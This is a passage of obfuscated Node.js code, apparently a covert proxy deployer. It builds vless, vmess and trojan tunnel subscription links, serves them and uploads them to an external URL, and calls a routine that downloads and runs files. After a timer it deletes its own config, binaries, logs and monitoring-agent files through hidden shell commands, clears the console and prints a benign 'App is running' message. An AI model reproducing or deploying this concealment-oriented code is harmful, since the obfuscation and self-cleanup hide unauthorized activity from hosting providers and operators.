_0x532f61={_0x42925e:0x2a7,_0xe5fee4:0x268,_0x51abf9:0x251,_0xc6a8ab:0x20a,_0x34fa44:0x2ac,_0x2c5b47:0x257,_0x1d9484:0x1fe,_0x1fe7f2:0x223,_0x1a8e53:0x255},_0xf90df8=await _0x3f2f3a(),_0xa63d90=NAME?NAME+'-'+_0xf90df8:_0xf90df8;return new Promise(_0x56855f=>{const _0x2ddb55={_0x1acc9e:0x231,_0x108e90:0x22b};setTimeout(()=>{const _0x28abb0=_0x2263,_0x43b51c={'v':'2','ps':''+_0xa63d90,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x28abb0(_0x532f61._0x42925e),'host':_0x36494f,'path':_0x28abb0(0x261),'tls':'tls','sni':_0x36494f,'alpn':'','fp':_0x28abb0(_0x532f61._0xe5fee4)},_0x5f1896=_0x28abb0(0x216)+UUID+'@'+CFIP+':'+CFPORT+_0x28abb0(_0x532f61._0x51abf9)+_0x36494f+'&fp=firefox&type=ws&host='+_0x36494f+_0x28abb0(0x267)+_0xa63d90+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x28abb0(_0x532f61._0xc6a8ab)](_0x43b51c))['toString'](_0x28abb0(0x22b))+_0x28abb0(0x242)+UUID+'@'+CFIP+':'+CFPORT+_0x28abb0(0x1f6)+_0x36494f+_0x28abb0(_0x532f61._0x34fa44)+_0x36494f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0xa63d90+_0x28abb0(0x236);console['log'](Buffer[_0x28abb0(_0x532f61._0x2c5b47)](_0x5f1896)['toString']('base64')),fs[_0x28abb0(0x297)](subPath,Buffer['from'](_0x5f1896)['toString'](_0x28abb0(0x22b))),console[_0x28abb0(_0x532f61._0x1d9484)](FILE_PATH+_0x28abb0(_0x532f61._0x1fe7f2)),uploadNodes(),app[_0x28abb0(_0x532f61._0x1a8e53)]('/'+SUB_PATH,(_0x19801f,_0x4a2bd8)=>{const _0x2fad1d=_0x28abb0,_0x13c30c=Buffer[_0x2fad1d(0x257)](_0x5f1896)[_0x2fad1d(_0x2ddb55._0x1acc9e)](_0x2fad1d(_0x2ddb55._0x108e90));_0x4a2bd8[_0x2fad1d(0x22c)](_0x2fad1d(0x1fb),'text/plain;\x20charset=utf-8'),_0x4a2bd8[_0x2fad1d(0x233)](_0x13c30c);}),_0x56855f(_0x5f1896);},0x7d0);});}}async function uploadNodes(){const _0x214a9e={_0x17aa95:0x29f,_0xc92eed:0x280,_0x34f8a3:0x291,_0x4c9655:0x28f,_0x5c6be2:0x218,_0xe253c6:0x1fe},_0xc5abef=_0x5c8937;if(UPLOAD_URL&&PROJECT_URL){const _0x86bc6d=PROJECT_URL+'/'+SUB_PATH,_0x2f8160={'subscription':[_0x86bc6d]};try{const _0x3bf917=await axios[_0xc5abef(0x2a6)](UPLOAD_URL+_0xc5abef(0x282),_0x2f8160,{'headers':{'Content-Type':_0xc5abef(0x230)}});return _0x3bf917&&_0x3bf917['status']===0xc8?(console['log'](_0xc5abef(_0x214a9e._0x17aa95)),_0x3bf917):null;}catch(_0x35694e){if(_0x35694e['response']){if(_0x35694e['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xc5abef(_0x214a9e._0xc92eed)](listPath))return;const _0xc5616b=fs[_0xc5abef(_0x214a9e._0x34f8a3)](listPath,_0xc5abef(0x219)),_0x2a94c8=_0xc5616b[_0xc5abef(0x1ef)]('\x0a')[_0xc5abef(_0x214a9e._0x4c9655)](_0x4de755=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xc5abef(0x269)](_0x4de755));if(_0x2a94c8[_0xc5abef(_0x214a9e._0x5c6be2)]===0x0)return;const _0x4de1b4=JSON[_0xc5abef(0x20a)]({'nodes':_0x2a94c8});try{const _0x36135d=await axios[_0xc5abef(0x2a6)](UPLOAD_URL+_0xc5abef(0x25b),_0x4de1b4,{'headers':{'Content-Type':'application/json'}});return _0x36135d&&_0x36135d[_0xc5abef(0x2a9)]===0xc8?(console[_0xc5abef(_0x214a9e._0xe253c6)]('Nodes\x20uploaded\x20successfully'),_0x36135d):null;}catch(_0x4bc746){return null;}}else return;}}function cleanFiles(){const _0x4b8e67={_0x697b57:0x25d,_0x304c2e:0x22e},_0x3cf84d={_0x1a1163:0x1fe,_0x504f68:0x279,_0x58acf6:0x1fe,_0x454ff8:0x2b8};setTimeout(()=>{const _0x498bd8={_0xf00b88:0x287},_0x4a7ead=_0x2263,_0x450c62=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x450c62['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x450c62[_0x4a7ead(0x259)](phpPath);process['platform']===_0x4a7ead(0x2b2)?exec(_0x4a7ead(_0x4b8e67._0x697b57)+_0x450c62[_0x4a7ead(0x1f5)]('\x20')+'\x20>\x20nul\x202>&1',_0xce4420=>{const _0x580d86=_0x4a7ead;console['clear'](),console[_0x580d86(_0x3cf84d._0x1a1163)](_0x580d86(_0x3cf84d._0x504f68)),console[_0x580d86(_0x3cf84d._0x58acf6)](_0x580d86(_0x3cf84d._0x454ff8));}):exec(_0x4a7ead(_0x4b8e67._0x304c2e)+_0x450c62[_0x4a7ead(0x1f5)]('\x20')+_0x4a7ead(0x204),_0x46f47a=>{const _0xb3aedc=_0x4a7ead;console[_0xb3aedc(_0x498bd8._0xf00b88)](),console['log']('App\x20is\x20running'),console[_0xb3aedc(0x1fe)](_0xb3aedc(0x2b8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5b21a6={_0x254dfa:0x230,_0x44d441:0x1fe,_0x4108de:0x25c,_0x2e9821:0x20e},_0x4605ef=_0x5c8937;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4605ef(0x1fe)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x43cf51=await axios['post'](_0x4605ef(0x21d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4605ef(_0x5b21a6._0x254dfa)}});return console[_0x4605ef(_0x5b21a6._0x44d441)](_0x4605ef(_0x5b21a6._0x4108de)),_0x43cf51;}catch(_0x14de57){return console[_0x4605ef(0x23e)](_0x4605ef(0x27c)+_0x14de57[_0x4605ef(_0x5b21a6._0x2e9821)]),null;}}async function startserver(){const _0x185439={_0x300987:0x285},_0x4c5e38=_0x5c8937;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x431b5e){console[_0x4c5e38(0x23e)](_0x4c5e38(_0x185439._0x300987),_0x431b5e);}}startserver()[_0x5c8937(0x21b)](_0x4e581f=>{const _0x12e642={_0x19545c:0x252},_0x5bcd1a=_0x5c8937;console[_0x5bcd1a(0x23e)](_0x5bcd1a(_0x12e642._0x19545c),_0x4e581f);}),app[_0x5c8937(0x28a)](PORT,()=>console[_0x5c8937(0x1fe)](_0x5c8937(0x26e)+PORT+'!'));
